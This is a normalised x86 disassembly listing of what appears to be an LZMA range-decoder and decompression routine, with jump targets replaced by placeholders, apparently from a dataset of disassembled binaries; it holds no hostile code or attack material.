mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x14 ]
or eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
movzx eax [ edx + ecx * 2 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x14 ]
or ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x14 ]
or edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x14 ]
or eax 0x8
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x28 ]
add ecx 0x112
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x2c ]
sub edx 0xc
mov [ ebp - 0x2c ] edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
sub_4093d0
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x48 ] 0x112
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x2c ]
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
sub edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
sub eax [ edx + 0x2c ]
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x24 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ecx + 0x30 ] eax
mov [ ebp - 0x18 ] 0x0
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x1
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x1c ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_4094f0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
call sub_407d40
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
sub ecx [ eax + 0x2c ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub eax [ edx + 0x24 ]
cmp eax [ ebp - 0xc ]
jbe r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x2c ]
cmp eax [ edx + 0xc ]
jb r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4093d0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
cmp edx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ecx + 0x30 ] eax
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x112
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x48 ] 0x112
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x48 ] 0x112
jb r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
sub_4095c0
push ebp
mov ebp esp
sub esp 0x68
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov edx 0x1
mov ecx [ eax + 0x8 ]
shl edx cl
sub edx 0x1
mov eax [ ebp + 0x8 ]
and edx [ eax + 0x2c ]
mov [ ebp - 0x44 ] edx
mov ecx [ ebp - 0x28 ]
shl ecx 0x4
mov edx [ ebp - 0x24 ]
lea eax [ edx + ecx * 2 ]
mov ecx [ ebp - 0x44 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
movzx ecx [ eax ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x180 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0xe6c
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x58 ] 0x3
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
lea eax [ edx + ecx * 2 + 0x198 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
movzx edx [ ecx ]
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x28 ] 0x0
mov ecx [ ebp - 0x24 ]
add ecx 0x664
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x58 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x5c ] ecx
jmp r-xdata
cmp [ ebp - 0x28 ] 0x7
jae r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
movzx ecx [ eax ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx 0x4
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
cmp eax [ ecx + edx + 0x38 ]
jae r-xdata
mov [ ebp - 0x30 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx 0x1
mov ecx [ ecx + 0x4 ]
shl edx cl
sub edx 0x1
mov eax [ ebp + 0x8 ]
and edx [ eax + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ ebp - 0x5c ]
movzx eax [ ecx + eax - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov esi 0x8
sub esi [ ecx ]
mov ecx esi
sar eax cl
add edx eax
imul edx edx 0x300
mov eax [ ebp - 0x10 ]
lea ecx [ eax + edx * 2 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x1b0 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x28 ]
shl eax 0x4
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax * 2 + 0x1e0 ]
mov eax [ ebp - 0x44 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
shl edx 0x8
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x60 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x2
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x44 ]
shl edx 0x3
mov eax [ ebp - 0x10 ]
lea ecx [ eax + edx * 2 + 0x4 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x48 ] 0x8
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + 0x24 ]
sub ecx [ edx + eax + 0x38 ]
add ecx [ ebp - 0x60 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
movzx ecx [ eax + ecx ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] 0x100
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x30 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax * 2 + 0x1c8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
movzx ecx [ eax ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x40 ]
and edx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x50 ]
not edx
and edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x100
jb r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x28 ] 0xc
mov ecx [ ebp - 0x24 ]
add ecx 0xa68
mov [ ebp - 0x10 ] ecx
mov eax 0x3
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x204
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x48 ] 0x100
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x44 ]
shl ecx 0x3
mov edx [ ebp - 0x10 ]
lea eax [ edx + ecx * 2 + 0x104 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x54 ] 0x8
mov [ ebp - 0x48 ] 0x8
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x4c ]
shl edx 0x1
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x4c ]
and eax [ ebp - 0x40 ]
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x10 ]
lea eax [ edx + ecx * 2 ]
mov ecx [ ebp - 0x50 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp - 0x34 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x68 ] ecx
mov edx [ ebp - 0x68 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov [ ebp - 0x58 ] 0x1
jmp r-xdata
cmp [ ebp - 0x34 ] 0x100
jb r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
